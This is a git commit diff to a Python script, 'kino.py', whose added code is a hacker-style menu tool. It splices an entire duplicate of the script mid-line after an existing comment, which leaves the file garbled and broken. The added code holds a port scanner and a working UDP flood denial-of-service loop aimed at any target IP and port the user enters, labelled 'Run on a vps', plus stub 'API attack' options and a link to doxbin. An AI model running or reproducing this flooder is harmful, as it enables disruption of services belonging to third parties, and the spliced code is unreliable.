f6bdf7a3b2f9bcf217b4d0f312b0ac1f2bfdc124
Exophobian <64628322+Exophobian@users.noreply.github.com>
2021-01-16 20:21:23 +0000

    Update kino.py

--- kino.py
+++ kino.py
@@ -42,7 +42,190 @@ def main():
 	time.sleep(1)
 	
 	user = input("User: ")
-	name = input("Secret Code: ") #insert name
+	name = input("Secret Code: ") #insert nameimport time
+import os
+import socket
+import random
+import webbrowser
+import requests
+
+#########################################
+# if you have this it means i leaked it #
+#########################################
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # for portscan
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # for dos attacker
+bytes = random._urandom(1024)
+
+time.sleep(1)
+os.system("clear")
+
+print("\u001b[36m		┈┈┈╲┈┈┈┈╱") #introduction
+print("		┈┈┈╱▔▔▔▔╲")
+print("		┈┈┃┈▇┈┈▇┈┃")
+print("		╭╮┣━━━━━━┫╭╮")
+print("		┃┃┃┈┈┈┈┈┈┃┃┃")
+print("		╰╯┃┈┈┈┈┈┈┃╰╯")
+print("		┈┈╰┓┏━━┓┏╯")
+print("		┈┈┈╰╯┈┈╰╯ \u001b[37mKino Developed By Exo")
+
+time.sleep(2)
+os.system("clear")
+print("\u001b[36m")
+print("		██╗  ██╗██╗███╗   ██╗ ██████╗")
+time.sleep(1)
+print("		██║ ██╔╝██║████╗  ██║██╔═══██╗")
+print("		█████╔╝ ██║██╔██╗ ██║██║   ██║")
+time.sleep(1)
+print("		██╔═██╗ ██║██║╚██╗██║██║   ██║")
+print("		██║  ██╗██║██║ ╚████║╚██████╔╝")
+time.sleep(1)
+print("		╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝")
+print("		═════════════════════════════")
+print("\u001b[37m       		Login     ") #login
+print("")
+
+time.sleep(1)
+
+user = input("User: ")
+name = input("Secret Code: ") #insert name
+if name == "phobian" or "fuggin" or "dexi": # Password DB
+	os.system("clear")
+	print("Login Successful...")
+	time.sleep(1)
+	os.system("clear")
+else:
+	print("Login Incorrect!")
+	exit()
+	
+while True:
+	os.system("clear")
+	print("\u001b[36m")
+	print("			██╗  ██╗██╗███╗   ██╗ ██████╗")
+	time.sleep(1)
+	print("			██║ ██╔╝██║████╗  ██║██╔═══██╗")
+	print("			█████╔╝ ██║██╔██╗ ██║██║   ██║")
+	time.sleep(1)
+	print("			██╔═██╗ ██║██║╚██╗██║██║   ██║")
+	print("			██║  ██╗██║██║ ╚████║╚██████╔╝")
+	time.sleep(1)
+	print("			╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝")
+	print('\u001b[37m		   	  Hello',user,'welcome to Kino') # main hub
+	print("		 	    Type 'HELP' For Options")
+	print("")
+	option = input("root@kino:~# ")
+	if option == "help" or "HELP":
+		print("""		╔══════════════════════════════════════════╗
+		║ \u001b[36m1. Portscan\u001b[37m       ║	    \u001b[36m2. Ping\u001b[37m        ║
+		║═══════════════════║══════════════════════║
+		║ \u001b[36m3. Credits\u001b[37m        ║	    \u001b[36m4. DoS\u001b[37m         ║
+		║═══════════════════║══════════════════════║
+		║ \u001b[36m5. Instagram\u001b[37m	    ║	    \u001b[36m6. Lookup\u001b[37m      ║
+		║═══════════════════║══════════════════════║
+		║ \u001b[36m7. API Methods\u001b[37m    ║	    \u001b[36m8. API Attack\u001b[37m  ║
+		╚══════════════════════════════════════════╝""")
+	option = input("root@kino:~# ")
+
+	if option == "1": #portscanner
+			os.system("clear")
+			print("\u001b[36m")
+			print("		██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗")
+			print("		██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║")
+			print("		██████╔╝███████╗██║     ███████║██╔██╗ ██║")
+			print("		██╔═══╝ ╚════██║██║     ██╔══██║██║╚██╗██║")
+			print("		██║██╗  ███████║╚██████╗██║  ██║██║ ╚████║")
+			print("		╚═╝╚═╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝")
+			print("\u001b[37m			You have selected Portscan")
+			print("		══════════════════════════════════════════")
+			host = input("Input Host: ")
+		
+			def main(port):
+				try:
+					s.connect((host,port))
+					return True
+				except:
+					return False
+			for x in range(1,65500):
+				if main(x):
+					print('Port',x,'is open on',host)
+	if option == "2":
+		os.system("clear")
+		print("\u001b[36m		You have selected Ping")
+		ping = input("Input Host: ")
+		os.system("clear")
+		os.system("ping {}" .format (ping))
+	if option == "3":
+		os.system("clear")
+		print("\u001b[36mCreated by Exo, insta: @exo.phobian discord: idk it will prob get banned next week lol")
+
+	if option == "4":
+		os.system("clear")
+		print("\u001b[36m")
+		print("		██████╗  ██████╗ ███████╗")
+		print("		██╔══██╗██╔═══██╗██╔════╝")
+		print("		██║  ██║██║   ██║███████╗")
+		print("		██║  ██║██║   ██║╚════██║")
+		print("		██████╔╝╚██████╔╝███████║")
+		print("		╚═════╝  ╚═════╝ ╚══════╝ \u001b[37m(Run on a vps)") # dos attacker
+		print("		You selected DoS")
+		ip = input("Target: ")
+		port = int(input("Port: "))
+		dur = int(input("Time: "))
+		print("\n \n Attack Sent")
+		timeout = time.time() + dur
+		sent = 0
+	
+		while True:
+			try:
+				if time.time() > timeout:
+					break
+				else:
+					pass
+				sock.sendto(bytes, (ip, port))
+				sent = sent + 1
+			except KeyboardInterrupt:
+				print("Stopped...")
+				
+	if option == "5":
+		os.system("clear")
+		print("Loading...")
+		webbrowser.open("https://www.instagram.com/exo.phobian/")
+	if option == "6":
+		print("In Development Still")
+		
+		
+	if option == "7":
+		os.system("clear")
+		print("\u001b[36m")
+		print("	███╗   ███╗███████╗████████╗██╗  ██╗ ██████╗ ██████╗ ███████╗")
+		print("	████╗ ████║██╔════╝╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗██╔════╝")
+		print("	██╔████╔██║█████╗     ██║   ███████║██║   ██║██║  ██║███████╗")
+		print("	██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║   ██║██║  ██║╚════██║")
+		print("	██║ ╚═╝ ██║███████╗   ██║   ██║  ██║╚██████╔╝██████╔╝███████║")
+		print("	╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝")
+		print("\u001b[37m")
+		print("		[UDP] [TCP] [VSE] [ACK] [CNC] [XMAS] [DNS]")
+		print("")
+	if option == "8":
+		os.system("clear")
+		print("\u001b[36m")
+		print("		 █████╗ ██████╗ ██╗")
+		print("		██╔══██╗██╔══██╗██║")
+		print("		███████║██████╔╝██║")
+		print("		██╔══██║██╔═══╝ ██║")
+		print("		██║  ██║██║     ██║")
+		print("		╚═╝  ╚═╝╚═╝     ╚═╝") # api hub
+		print("\u001b[37m		you selected API Attack HUB")
+		print("")
+		print("		[UDP] [TCP] [VSE] [ACK] [CNC] [XMAS] [DNS]")
+		ip1 = input("IP: ")
+		prt = input("Port: ")
+		tme = input("Time: ") # unfinished
+		method = input("Method: ")
+		
+		webbrowser.open("https://doxbin.org/uploads/Exo")
+		print("attack sending...")
+		
 	if name == "6969":
 		os.system("clear")
 		print("Login Successful...")
